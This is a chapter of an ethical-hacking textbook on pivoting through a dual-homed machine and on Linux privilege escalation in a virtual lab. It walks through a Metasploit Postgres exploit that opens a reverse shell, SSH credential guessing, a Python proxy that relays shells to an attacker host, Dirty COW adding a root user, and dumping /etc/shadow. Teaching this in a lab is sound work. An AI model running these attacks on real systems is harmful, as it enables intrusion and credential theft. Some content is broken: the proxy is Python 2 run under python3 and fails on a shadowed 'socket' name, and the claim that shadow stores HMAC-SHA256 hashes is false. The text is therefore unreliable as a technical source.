<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch14"><span epub:type="pagebreak" id="page_289"/><strong><span class="big">14</span><br/>PIVOTING AND PRIVILEGE ESCALATION</strong></h2>
		<p class="verse"><em>What I cannot create, I do not understand.</em></p>
		<p class="chap-au">–Richard Feynman</p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents">By this point in the book, we’ve explored many ways of compromising a single machine. But attackers often want full control of the entire private network they’re targeting. With full control of the network, the attacker can move freely from machine to machine, extracting information and implanting malware as they please. Moreover, once the attacker has control of the network, removing them can be very difficult because they could be hiding anywhere. In this chapter we’ll explore two techniques for moving through the network.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_290"/>First, you’ll learn a pivoting technique that attackers can use to gain access to a private network by routing traffic through a dual-homed machine with access to both a public network and private network. Second, we’ll extract user credentials from a machine’s memory using a privilege escalation attack. In some cases, we can use the stolen credentials to log in to another machine on the private network. Using stolen credentials is one of the best ways an attacker can move around in a network.</p>
		<h3 class="h3" id="ch14lev1"><strong>Pivoting from a Dual-Homed Device</strong></h3>
		<p class="noindent">We often refer to networks that are open to anyone as public networks. For example, the internet is a public network. On the other hand, networks that are closed to the public, such as a network inside an organization, are called private networks. However, users on a private network will often need access to resources on a public network such as the internet. For example, employees in a corporation still need access to Google. Thus, companies often use firewalls to safely bridge the public network (the internet) and the private, corporate network. Because the firewall is connected to both the public and private networks, we refer to the machine running the firewall as a <em>dual-homed device</em>.</p>
		<p class="indent">Dual-homed devices are critical for attackers because most attackers on a public network who hope to access an organization’s private network must pass through this firewall. Routing traffic through a dual-homed machine to gain access to a network is a technique called <em>pivoting</em>. Let’s set up a test network to demonstrate pivoting. We’ll compromise the Metasploitable virtual machine, which we’ll configure as a dual-homed device, and use it as a proxy to access the private network to attack an Ubuntu virtual machine.</p>
		<h4 class="h4" id="ch14lev2"><strong><em>Configuring a Dual-Homed Device</em></strong></h4>
		<p class="noindent">The pfSense machine in our virtual environment is an example of a dualhomed device because it acts as a bridge between our private network and the public internet. However, we don’t want to compromise our pfSense machine in our pivoting demonstration; it protects our devices from being attacked by real attackers on the internet. Instead, we’ll convert the Metasploitable virtual machine into a dual-homed device and attach it to another private network containing an Ubuntu virtual machine. <a href="ch14.xhtml#ch14fig1">Figure 14-1</a> depicts the network we’ll be attacking.</p>
		<div class="image" id="ch14fig1">
			<span epub:type="pagebreak" id="page_291"/>
			<img alt="image" src="../images/ch14fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 14-1: An overview of the network</em></p>
		<p class="indent">The Metasploitable server’s primary interface is denoted at <span class="ent">➊</span>. This is the interface we’ll connect to our simulated public network containing the Kali Linux virtual machine. The second interface <span class="ent">➋</span> is connected to the private network. Our goal will be to compromise the Metasploitable server and use it to route traffic from the primary interface to the private network on the secondary interface. But first, we must set up the virtual environment.</p>
		<p class="indent">We’ll begin by enabling the second interface on the Metasploitable virtual machine and then connecting it to a private network. To do this, navigate to Metasploitable’s settings in VirtualBox (<a href="ch14.xhtml#ch14fig2">Figure 14-2</a>).</p>
		<div class="image" id="ch14fig2">
			<img alt="image" src="../images/ch14fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 14-2: Configuring the second network interface</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_292"/>Select the <strong>Network</strong> tab <span class="ent">➊</span>, click the second adapter <span class="ent">➋</span>, and then enable it <span class="ent">➌</span>. Name the private network <strong>Private LAN</strong> <span class="ent">➍</span>.</p>
		<p class="indent">Next we must assign an IP address to the interface we just enabled. We’ll do that by editing the Metasploitable server’s network <em>interface</em> file. Run the following command to open the file in <code>vim</code>, which comes preinstalled on Metasploitable:</p>
		<pre>   msadmin@metasploitable:~# <span class="codestrong1">sudo vim /etc/network/interface</span><br/>
   # This file describes the network interfaces available on your system<br/>
   # and how to activate them. For more information, see interfaces(5).<br/><br/>
   # The loopback network interface<br/>
   auto lo<br/>
   iface lo inet loopback<br/><br/>
   # The primary network interface<br/>
   auto eth0<br/><span class="ent">➊</span> iface eth0 inet dhcp<br/><br/>
   # The secondary network interface<br/>
   auto eth1<br/><span class="ent">➋</span> iface eth1 inet static<br/><span class="ent">➌</span> address 10.0.0.1<br/><span class="ent">➍</span> netmask 255.255.255.0</pre>
		<p class="indent">When you open the file, you should see the primary interface defined at <span class="ent">➊</span>. This interface is usually connected to the public network. The value <code>iface eth0</code> refers to the Ethernet (<code>eth0</code>) interface. See <a href="ch01.xhtml#ch1">Chapter 1</a> for a discussion on interfaces. Next, <code>inet</code> represents IPv4 addressing, and <code>dhcp</code> means we’ll allow the <em>dynamic host configuration protocol (DHCP)</em> server to assign an IP address to the interface. DHCP is the protocol routers normally use to assign IP addresses to machines when they join a network. For example, your home Wi-Fi router has a DHCP server built in, meaning that your laptop uses the DHCP protocol to obtain an IP address when it connects. This ensures that your laptop doesn’t use the same IP address as a machine already connected to your network. Alternatively, a value of <code>static</code> means that we’ll manually assign an IP address.</p>
		<p class="indent">We’ll configure the second interface and set it to have a static IPv4 address <span class="ent">➋</span> of <code>10.0.0.1</code> <span class="ent">➌</span> and then set its subnet mask to <code>255.255.255.0</code> <span class="ent">➍</span>. Save the file and then start the <code>eth1</code> interface by running the following command:</p>
		<pre>msadmin@metasploitable:~# <span class="codestrong1">sudo ip link set dev eth1 up</span></pre>
		<p class="indent">Lastly, restart the networking interface:</p>
		<pre>msadmin@metasploitable:~# <span class="codestrong1">sudo /etc/init.d/networking restart</span></pre>
		<h4 class="h4" id="ch14lev3"><span epub:type="pagebreak" id="page_293"/><strong><em>Connecting a Machine to Your Private Network</em></strong></h4>
		<p class="noindent">Now that we’ve set up our dual-homed machine, we can move the Ubuntu virtual machine to our new private network. However, as soon as we do, it will no longer have access to the internet. So before we move it, let’s take the opportunity to configure it.</p>
		<p class="indent">We’ll use OpenSSH to log in to the Ubuntu machine. OpenSSH is an open source implementation of an SSH server that allows users to connect to a machine using SSH. Log in to your Ubuntu virtual machine and install the OpenSSH server:</p>
		<pre>victim@ubuntu:~$ <span class="codestrong1">sudo apt-get install openssh-server</span><br/>victim@ubuntu:~$ <span class="codestrong1">sudo systemctl enable ssh</span></pre>
		<p class="indent">Once the installation completes, move your Ubuntu virtual machine to the private network by updating the interface in VirtualBox to connect to <strong>Private LAN</strong>.</p>
		<p class="indent">Next, you’ll need to assign an IP address to the interface on the Ubuntu virtual machine. This is because our private network doesn’t have a DHCP server. Set the static IP address on your Ubuntu virtual machine by opening <strong>Settings</strong> (<a href="ch14.xhtml#ch14fig3">Figure 14-3</a>).</p>
		<div class="image" id="ch14fig3">
			<img alt="image" src="../images/ch14fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 14-3: Setting up a static IP address on the Ubuntu machine</em></p>
		<p class="indent">Select <strong>Network</strong>, click the <strong>Settings</strong> gear icon, and click the <strong>IPv4</strong> tab. Select <strong>Manual</strong> configuration and set the IP address to <strong>10.0.0.15</strong>, the subnet mask to <strong>255.255.255.0</strong>, and the default gateway to <strong>10.0.0.1</strong>.</p>
		<p class="indent">Check that you can access the Metasploitable server from the Ubuntu virtual machine by pinging it. If you can reach the Metasploitable server, you should get the following, with no packets lost:</p>
		<pre>victim@ubuntu:~$ <span class="codestrong1">ping 10.0.0.1</span><br/>PING 10.0.0.1 (10.0.0.1): 56 data bytes<br/>
64 bytes from 10.0.0.1: icmp_seq=0 ttl=115 time=15.049 ms<br/>
64 bytes from 10.0.0.1: icmp_seq=1 ttl=115 time=14.385 ms<br/><span epub:type="pagebreak" id="page_294"/>64 bytes from 10.0.0.1: icmp_seq=2 ttl=115 time=15.036 ms<br/>
64 bytes from 10.0.0.1: icmp_seq=3 ttl=115 time=22.304 ms<br/>
64 bytes from 10.0.0.1: icmp_seq=4 ttl=115 time=23.752 ms<br/>
64 bytes from 10.0.0.1: icmp_seq=5 ttl=115 time=14.254 ms<br/>
64 bytes from 10.0.0.1: icmp_seq=6 ttl=115 time=14.321 ms<br/>
^C<br/>
--- 10.0.0.1 ping statistics ---<br/>
7 packets transmitted, 7 packets received, 0.0% packet loss<br/>round-trip min/avg/max/stddev = 14.254/17.014/23.752/3.835 ms</pre>
		<p class="indent">Press CTRL-C to end the ping.</p>
		<p class="indent">Although your Ubuntu virtual machine can reach the Metasploitable machine, it doesn’t have access to anything outside of the private network. Similarly, no machines outside of the private network can access the Ubuntu virtual machine. This means that you’ve correctly set up your dual-homed machine and private network. Now let’s discuss how you can gain access to the private network by compromising the Metasploitable machine and transforming it into a bridge between the virtual environment’s internal LAN and the private LAN. We commonly refer to this bridge as a <em>proxy</em>, which is a program that takes data from one connection and passes it to another. You can think of it as an intermediary that facilitates a connection between two machines.</p>
		<h4 class="h4" id="ch14lev4"><strong><em>Pivoting with Metasploit</em></strong></h4>
		<p class="noindent">The Metasploit Framework has a built-in proxy capability, so let’s use it to execute a pivoting attack from start to finish. We’ll begin by scanning the Metasploitable server from our Kali Linux virtual machine. Once we’ve found a vulnerability, we’ll exploit it and upload a reverse shell. Then we’ll check to see if the Metasploitable server has access to multiple networks.</p>
		<p class="indent">After we’ve discovered that it does, we’ll use the Metasploitable server as a proxy to access the private network containing our Ubuntu virtual machine. Then, we’ll use stolen SSH credentials to log in to the Ubuntu virtual machine on the private network and upload another reverse shell. Lastly, we’ll control the reverse shell in the private LAN by routing our commands through the proxy on the Metasploitable server.</p>
		<p class="indent">Let’s get started. Scan the Metasploitable server using a vulnerability scanner like the ones we discussed in <a href="ch08.xhtml#ch8">Chapter 8</a>. The <em>Nexpose</em> vulnerability scanner allows you to perform scans from the Metasploit console. Keep in mind that these scanners use heuristics, meaning that they might incorrectly identify vulnerabilities. Thus, you might need to try multiple vulnerabilities before you discover one that gives you access to the machine.</p>
		<p class="indent">We discussed scanning in <a href="ch08.xhtml#ch8">Chapter 8</a>, so I will assume you have already identified some vulnerabilities. For variety, instead of exploiting our trusty FTP vulnerability, let’s exploit a vulnerability in the Postgres server that lets <span epub:type="pagebreak" id="page_295"/>us upload a reverse shell by exploiting a configuration error. If you haven’t already, start Metasploit on Kali Linux:</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo msfconsole</span></pre>
		<p class="indent">Next, select the Postgres exploit by entering the <code><strong>use</strong></code> keyword followed by the path to the exploit. We didn’t select a payload, so Metasploit will default to the <code>reverse_tcp</code> Meterpreter payload. See <a href="ch10.xhtml#ch10">Chapter 10</a> for an overview of the different types of payloads and how to select them.</p>
		<pre>msf6 &gt; <span class="codestrong1">use exploit/linux/postgres/postgres_payload</span><br/>
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp</pre>
		<p class="indent">Then, we’ll set the IP address of the remote host (<code>RHOST</code>). In our case, this is the IP address of the Metasploitable server (<code>192.168.1.101</code>). We’ll then execute the exploit by entering <code><strong>run</strong></code>.</p>
		<pre>msf6 exploit(linux/postgres/postgres_payload) &gt; <span class="codestrong1">set RHOST 192.168.1.101</span><br/>RHOST =&gt; 192.168.1.101<br/>msf6 exploit(linux/postgres/postgres_payload) &gt; <span class="codestrong1">run</span><br/><br/>
[*] Started reverse TCP handler on 192.168.1.115:4444<br/>
[*] 192.168.1.112:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC .....<br/>[*] Uploaded as /tmp/VfnRAqLD.so, should be cleaned up automatically<br/>[*] Sending stage (976712 bytes) to 192.168.1.101<br/>[*] Meterpreter session 1 opened (192.168.1.115:4444 -&gt; 192.168.1.101:52575) at .....<br/>meterpreter &gt;</pre>
		<p class="indent">Now that we have a Meterpeter shell, let’s check the interfaces on the Metasploitable server:</p>
		<pre>   meterpreter &gt; <span class="codestrong1">ipconfig</span><br/>
   ...<br/><span class="ent">➊</span> Interface  3<br/>
   ============<br/>
   Name         : eth1<br/>
   Hardware MAC : 08:00:27:d1:f1:26<br/>
   MTU          : 1500<br/>
   Flags        : UP,BROADCAST,MULTICAST<br/><span class="ent">➋</span> IPv4 Address : 10.0.0.1<br/>
   IPv4 Netmask : 255.255.255.0<br/>
   IPv6 Address : fe80::a00:27ff:fed1:f126<br/>
   IPv6 Netmask : ffff:ffff:ffff:ffff::</pre>
		<p class="indent">For simplicity I’ve omitted the loopback and primary interfaces in the output as these are always present in a network-connected device. We see a new interface <span class="ent">➊</span>, which indicates that this machine is connected to another network. We can now add a <em>route</em> that allows us to send traffic from the virtual environment’s internal LAN to the private LAN <span class="ent">➋</span>. A <em>route</em> is an entry in <span epub:type="pagebreak" id="page_296"/>the network table that instructs the operating system how to forward packets between interfaces. Once we’ve added the route, we’ll send the Meterpreter session to the background so that we can access the original Metasploit console. Deselect the current module using the <code><strong>back</strong></code> command:</p>
		<pre>meterpreter &gt; <span class="codestrong1">run autoroute -s 10.0.0.1/24</span><br/>meterpreter &gt; <span class="codestrong1">background</span><br/>
[*] Backgrounding session 1...<br/>msf6 exploit(linux/postgres/postgres_payload) &gt; <span class="codestrong1">back</span></pre>
		<p class="indent">Now let’s load a reverse shell onto the Ubuntu virtual machine. Although you could simply log in to Ubuntu to do this, we’ll simulate a real attack scenario by assuming that you don’t know the credentials ahead of time. Instead, let’s pretend you’ve obtained several credentials during the OSINT phase of the attack that you can now use in a dictionary-based attack. We’ll try each of these credentials and hope that one of them allows us to log in to the SSH server. Create a file on your Kali Linux desktop containing the username and password of the Ubuntu machine called <em>Ubuntu_passwords.txt</em>. Each username–password pair should be on its own line with the username and password separated by a space. Add some dummy credentials, but remember to also include the username and password for your Ubuntu machine so that you can access the machine. Here is an example:</p>
		<pre>victim 1234<br/>user1 trustno1</pre>
		<p class="indent">Use this file in a dictionary-based attack on the SSH server. We’ll begin by selecting Metasploit’s <code>ssh_login</code> module. Then we set the remote host, supply the password file, and run the module:</p>
		<pre>msf6 &gt; <span class="codestrong1">use auxiliary/scanner/ssh/ssh_login</span><br/>msf6 auxiliary(scanner/ssh/ssh_login)&gt;<span class="codestrong1">set RHOST 10.0.0.15</span><br/>RHOST =&gt; 10.0.0.15<br/>msf6 auxiliary(scanner/ssh/ssh_login)&gt;<span class="codestrong1">set USERPASS_FILE /home/kali/Desktop/Ubuntu_passwords.txt</span><br/>USERPASS_FILE =&gt; /home/kali/Desktop/Ubuntu_passwords.txt<br/>msf6 auxiliary(scanner/ssh/ssh_login)&gt;<span class="codestrong1">run</span></pre>
		<p class="indent">When the attack completes, you should have a shell running on the Ubuntu virtual machine. Run the following command to view a list of all your sessions:</p>
		<pre>msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="codestrong1">sessions -l</span><br/>Active sessions<br/>
===============<br/>
  Id  Type                        Connection<br/>
  --  ----                        ----------<br/>
   1  meterpreter x86/linux       192.168.1.115:4444 -&gt; 192.168.1.112:41206 (192.168.1.112)<br/>
   2  shell linux                 192.168.1.115-192.168.1.112:59953 -&gt; 10.0.0.15:22 (10.0.0.15)</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_297"/>Session 2 is the Linux shell running on the Ubuntu machine. The Connection column shows that the connection to the shell flows from 192.168.1.115 (Kali Linux) to 192.168.1.112 (Metasploitable) to 10.0.0.15 (Ubuntu). To execute commands on the Ubuntu virtual machine, run the following command to select session 2. Then try running a terminal command like <code><strong>ls</strong></code>:</p>
		<pre>msf6 &gt; <span class="codestrong1">sessions 2</span><br/>
[*] Starting interaction with 2...<br/><span class="codestrong1">ls</span><br/>Desktop<br/>Documents<br/>Downloads</pre>
		<p class="indent">Now you can control the Ubuntu virtual machine on the private LAN from a machine outside of that network.</p>
		<p class="indent">In this example, we used Metasploit’s proxy. Next, we’ll discuss how you can write your own proxy.</p>
		<h4 class="h4" id="ch14lev5"><strong><em>Writing an Attacker Proxy</em></strong></h4>
		<p class="noindent">Create a folder called <em>ProxyFun</em> and copy the following code into a new file within that folder called <em>proxy.py</em>:</p>
		<pre>from SocketServer import BaseRequestHandler, TCPServer<br/>from socket import socket, AF_INET, SOCK_STREAM<br/>import sys<br/>class SockHandler(BaseRequestHandler):<br/><br/>
   <span class="ent">➊</span> def handle(self):<br/>
        self.data = self.request.recv(1024)<br/>
        print "Passing data from: "+ str(self.client_address[0]) + " to " + external_LAN_IP<br/>
        print self.data<br/><br/>
        socket = socket(AF_INET, SOCK_STREAM)<br/><br/>
        try:<br/>
        <span class="ent">➋</span>   socket.connect((external_LAN_IP, external_LAN_PORT))<br/>
             socket.sendall(self.data)<br/><br/>
             while 1:<br/>
                 command = socket.recv(1024)<br/>
                 if not command:<br/>
                     break<br/>
                 self.request.sendall(command)<br/>
         finally:<br/>
             socket.close()<br/><br/>if __name__ == '__main__':<br/>
      <span epub:type="pagebreak" id="page_298"/>private_LAN_IP, private_LAN_PORT, external_LAN_IP, external_LAN_PORT = sys.argv[1:]<br/>
   <span class="ent">➌</span> myserver = TCPServer((private_LAN_IP, private_LAN_PORT), SockHandler)<br/>
      myserver.serve_forever()</pre>
		<p class="indent">The proxy starts a TCP server to listen to the private LAN’s IP address <span class="ent">➌</span>. Remember that our target, the Ubuntu virtual machine, can only access IP addresses on the private network. So if we want to communicate with it, we must set up a TCP server to listen on an IP address associated with the interface connected to the private network.</p>
		<p class="indent">For now, we’ll assume that we’ve already implanted a reverse shell on the Ubuntu virtual machine, so we can focus on seeing how the data flows from the reverse shell in the private LAN, through the proxy, and into the attacker’s Kali Linux machine on our simulated public network.</p>
		<p class="indent">First, the reverse shell will connect to the proxy’s IP address on the private LAN. When the shell connects to the proxy and sends its first message, the proxy will extract the data from the message <span class="ent">➊</span> and open a new TCP connection on the external LAN to the hacker’s server. The proxy will send data from the shell in the private LAN to the external LAN, acting as a bridge <span class="ent">➋</span>. The proxy will also listen for traffic from the external LAN, which it will send to the shell on the private LAN. Great! You should now have a two-way bridge between the private LAN and the external LAN.</p>
		<p class="indent">Now let’s test our proxy. Instead of running the TCP server code we wrote in <a href="ch04.xhtml#ch4">Chapter 4</a>, we’ll keep this test lightweight. We’ll use netcat (<code>nc</code>) to start a new TCP server that listens (<code>l</code>) on port (<code>p</code>) 5050. We’ll also enable the verbose flag (<code>v</code>) to print out information on the connection:</p>
		<pre>kali@kali:~$ <span class="codestrong1">nc -lvp 5050</span></pre>
		<p class="indent">Next, copy the <em>proxy.py</em> file onto the Metasploitable server and run it:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">python3 proxy.py 10.0.0.1 4040 <span class="codeitalic">&lt;Kali IP address&gt;</span> 5050</span></pre>
		<p class="indent">Now that the proxy is up and running, open the Ubuntu virtual machine on the private network. Instead of using the reverse shell we wrote in <a href="ch04.xhtml#ch4">Chapter 4</a>, we’ll use netcat to connect to the proxy.</p>
		<pre>victim@ubuntu:~$ <span class="codestrong1">nc 10.0.0.1 4040</span></pre>
		<p class="indent">Enter the phrase <code><strong>BOT Reporting For Duty</strong></code> in the Ubuntu terminal running netcat. If the proxy is working correctly, it will route the private LAN’s traffic to the terminal on your Kali Linux machine.</p>
		<h3 class="h3" id="ch14lev6"><strong>Extracting Password Hashes on Linux</strong></h3>
		<p class="noindent">Once you’ve gained access to a machine, you can try to extract user credentials from the machine’s memory that you can use to log in to other machines and move around the network. This section describes how you can extract usernames and password hashes from a Linux machine using privilege escalation techniques.</p>
		<h4 class="h4" id="ch14lev7"><span epub:type="pagebreak" id="page_299"/><strong><em>Where Linux Stores Usernames and Passwords</em></strong></h4>
		<p class="noindent">The operating system stores usernames in the <em>/etc/passwd</em> file, which anyone on the system can read. The file’s name is deceiving, because it doesn’t contain any passwords. Still, we can often glean useful information from this file, such as whether an account requires a password. Run the following command to view the contents of this file:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cat /etc/passwd</span><br/>root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin</pre>
		<p class="indent">A colon separates each property of entries, which follow this format:</p>
		<pre>username:has_password:user_id:group_id:user_info:shell_path</pre>
		<p class="indent">The second property, <code>has_password</code>, specifies whether the user has a password. An <code>x</code> in this property means that the user account has a password, and an empty field means it’s a guest account that doesn’t require a password.</p>
		<p class="indent">So, where does the operating system store the passwords? After all, it must keep a copy of the passwords to compare them to the value a user enters when they log in. Linux doesn’t store plaintext passwords. Instead, it stores an HMAC-SHA256 hash of the passwords in the file <em>/etc/shadow</em>. When a user logs in, Linux hashes their password, compares it to the stored hash, and gives access if they match.</p>
		<p class="indent">You can extract these password hashes by reading the <em>/etc/shadow</em> file; however, you’ll need root permissions to do so, as you can see by running the <code><strong>ls</strong></code> command with the <code><strong>-l</strong></code> option:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">ls -l /etc/shadow</span><br/>
-rw-r-----  1 root     shadow   1233 2042-05-20 17:30 shadow</pre>
		<p class="indent">The label <code>-rw-r-----</code> represents the file’s permissions. <a href="ch14.xhtml#ch14fig4">Figure 14-4</a> explains the structure of Linux permissions.</p>
		<p class="indent">The permissions on the <em>/etc/shadow/</em> file indicate that only the owner (<code>root</code>) and the group (<code>shadow</code>) can read the file, and that only a root user can write to it.</p>
		<p class="indent">If we’re lucky, we’ve found credentials for a user with root permissions and can gain root access to the system by entering <code>sudo -i</code>. But suppose we aren’t this lucky. In that case, we can still gain root access by exploiting a vulnerability in the operating system, a process commonly known as <em>privilege escalation</em>.</p>
		<div class="image" id="ch14fig4">
			<span epub:type="pagebreak" id="page_300"/>
			<img alt="image" src="../images/ch14fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 14-4: Linux permissions</em></p>
		<p class="indent">An attacker might use a variety of techniques to gain root privileges on a system. For example, they might use a buffer overflow attack to inject code into a kernel module or driver. The kernel module would then execute the code with root-level permissions, giving the hacker a reverse shell with root permissions.</p>
		<p class="indent">An attacker could also take advantage of incorrect permissions on a file or directory to escalate privileges. For example, if a process executes a file with root privileges, an attacker could modify the file to contain code that runs a reverse shell.</p>
		<p class="indent">The <code>unix-privesc</code> tool is preinstalled on Kali Linux and allows you to check a system for vulnerabilities that might allow a privilege escalation attack:</p>
		<pre>unix-privesc-check standard</pre>
		<p class="indent">The Meterpreter shell has similar functionality built in. You can use the command <code>getsystem</code> to search for and exploit possible privilege escalation vulnerabilities:</p>
		<pre>meterpreter &gt; <span class="codestrong1">getsystem</span></pre>
		<p class="indent">After you gain root privileges, run the Meterpreter module <code><strong>hashdump</strong></code> to extract the hashes from the system.</p>
		<pre>meterpreter &gt; <span class="codestrong1">run hashdump</span></pre>
		<p class="indent">Now that we’ve looked at these privilege escalations in general, let’s take a look at an example.</p>
		<h4 class="h4" id="ch14lev8"><strong><em>Performing a Dirty COW Privilege Escalation Attack</em></strong></h4>
		<p class="noindent">In 2016, Phil Oester discovered a kernel-level vulnerability nicknamed <em>Dirty COW</em>. The vulnerability (CVE-2016-5195) allows an attacker without root privileges to edit any file by exploiting a bug in how the Linux kernel manages memory. Among other things, an attacker could use this vulnerability <span epub:type="pagebreak" id="page_301"/>to create a new user with root privileges by editing the <em>/etc/shadow</em> file we discussed earlier.</p>
		<p class="indent">The vulnerability takes its name from the process the Linux kernel uses to manage <em>virtual memory</em>. Virtual memory is the mechanism operating systems use to give processes their own isolated memory spaces. It does this by creating a table that maps the process’s virtual memory address to a real physical address in memory. Because separate processes may share libraries or files, two processes may have virtual memory addresses that point to the same physical memory. The virtual memory will only create a copy if one process writes to the memory, a procedure known as <em>copy-on-write (COW)</em>.</p>
		<p class="indent">The Dirty COW vulnerability tricks the operating system into letting a user edit a file they don’t own. It does this by exploiting a race condition in the Linux kernel. A <em>race condition</em> occurs when two or more threads rush to access a variable and the program’s output depends on the order in which the threads finish. Attackers can exploit race conditions by repeatably performing multiple order-sensitive operations until they achieve a favorable order of events.</p>
		<p class="indent">The Dirty COW vulnerability exploits a race condition related to how the Linux kernel reads and writes files. The Linux kernel blocks processes from writing to read-only files, but it does allow a process to write to a copy of a read-only file. When a process writes to its own copy, the Linux kernel would normally execute the following events in order: 1) open a processspecific copy of the file, 2) write to the copy, and 3) discard the changes and map back to the original file, thus leaving the original file unchanged.</p>
		<p class="indent">However, if an attacker uses two threads to independently write and discard changes, a race condition can occur that causes the kernel to execute the sequence out of order: 1) open a process-specific copy of the file, 3) discard the changes and map back to the original file, and 2) write to the copy, which is now the original file. In this scenario, the attacker was able to trick the kernel into allowing them to write to a read-only file.</p>
		<p class="indent">We can use this vulnerability to edit the read-only password file and add a new user with root privileges. Let’s execute this privilege escalation attack on the Metasploitable server. We’ll start by discovering whether your server is vulnerable in the first place. Log in to it and then run the <code><strong>whoami</strong></code> command to get the current user, and <code><strong>uname -a</strong></code> to get the current version of Linux:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">whoami</span><br/>msfadmin<br/>msfadmin@metasploitable:~$ <span class="codestrong1">uname -a</span><br/>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</pre>
		<p class="indent">When you have the server’s Linux version, use <code>searchsploit</code> to search for known vulnerabilities affecting that version:</p>
		<pre>kali@kali:~$ <span class="codestrong1">searchsploit Linux Kernel 2.6.24</span><br/>
------------------------------------------------ -----------------------<br/>Exploit Title                                   |  Path<br/>
------------------------------------------------ -----------------------<br/><span epub:type="pagebreak" id="page_302"/>Linux Kernel (Solaris 10 / &lt; 5.10 138888-01) -  | solaris/local/15962.c<br/>Linux Kernel 2.4.1 &lt; 2.4.37 / 2.6.1 &lt; 2.6.32-rc | linux/local/9844.py<br/>
...<br/>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW /proc/se | linux/local/40847.cpp<br/>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW PTRACE_P | linux/local/40838.c<br/>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE | linux/local/40839.c</pre>
		<p class="indent">As you can see, there are several implementations of Dirty COW. Some implementations use the vulnerability to change the password file, whereas others use it to inject shell code into a file with SUID privileges. <em>SUID</em> is a Linux permission that allows a regular user to execute a file with the privileges of that file’s owner. For example, a regular user can execute the <code>ping</code> command with root privileges even if they aren’t root because the SUID permission is set.</p>
		<p class="indent">Some exploits are more reliable than others. The <em>Dirty COW PTRACE</em> exploit works reliably on the Linux version running on the Metasploitable server.</p>
		<p class="indent">The code for the exploit is available on your Kali Linux virtual machine. Using <code><strong>searchsploit</strong></code>, supply the exploit number <code><strong>40839.c</strong></code>, and use the <code><strong>-p</strong></code> option to find the path to the exploit code:</p>
		<pre>kali@kali:~$ <span class="codestrong1">searchsploit -p 40839</span><br/>
  Exploit: Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 Condition Privilege Escalation (/etc/passwd Method)<br/>
     URL: https://www.exploit-db.com/exploits/40839<br/>
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c<br/>File Type: C source, ASCII text, with CRLF line terminators</pre>
		<p class="indent">Next, copy the code onto the Metasploitable machine:</p>
		<pre>kali@kali:~/$ <span class="codestrong1">scp /usr/share/exploitdb/exploits/linux/local/40839.c msfadmin@192.168.1.101:~/</span></pre>
		<p class="indent">Compile and execute the exploit:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">gcc -pthread 40839.c -o kernelexploit -lcrypt</span></pre>
		<p class="indent">Now run the exploit (<code>kernelexploit</code>). You’ll be prompted to create a new root user (<code>firefart</code>) and provide it with a password. I’ve chosen <code>147</code> here:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">./kernelexploit</span><br/>
/etc/passwd successfully backed up to /tmp/passwd.bak<br/>Please enter the new password: <span class="codestrong1">147</span><br/>Complete line:<br/>firefart:fibyOYsv7UnQ6:0:0:pwned:/root:/bin/bash<br/><br/>mmap: b7fa7000<br/>madvise 0<br/><br/>ptrace 0<br/>Done! Check /etc/passwd to see if the new user was created.<br/><span epub:type="pagebreak" id="page_303"/>You can log in with the username 'firefart' and the password '147'.</pre>
		<p class="indent">Switch to the newly created user with root privileges:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">su firefart</span><br/>Password:</pre>
		<p class="indent">Now you should be able to read the <em>/etc/shadow</em> file containing the password hashes:</p>
		<pre>firefart@metasploitable:/home/msfadmin# <span class="codestrong1">cat /etc/shadow</span><br/>root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::<br/>daemon:*:14684:0:99999:7:::<br/>bin:*:14684:0:99999:7:::<br/>sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::<br/>
...</pre>
		<p class="indent">The entry should contain the HMAC-SHA256 hash of the users’ passwords. You can crack these hashes using the tools introduced in <a href="ch12.xhtml#ch12">Chapter 12</a>. If you succeed, you’ll have escalated your privileges and extracted the plaintext passwords for the system’s users.</p>
		<p class="indent">You can now use these credentials to log in to other machines. The best credentials to extract are admin credentials because admins maintain the network and normally have access to all machines. However, regular user credentials can also be useful because they might have access to other machines on the network, like desktops or printers. Tools like <code>spray</code> allow you to test multiple passwords and connections simultaneously. However, these tools do unusual things and could generate security alerts, so you’ll want to be careful when using them.</p>
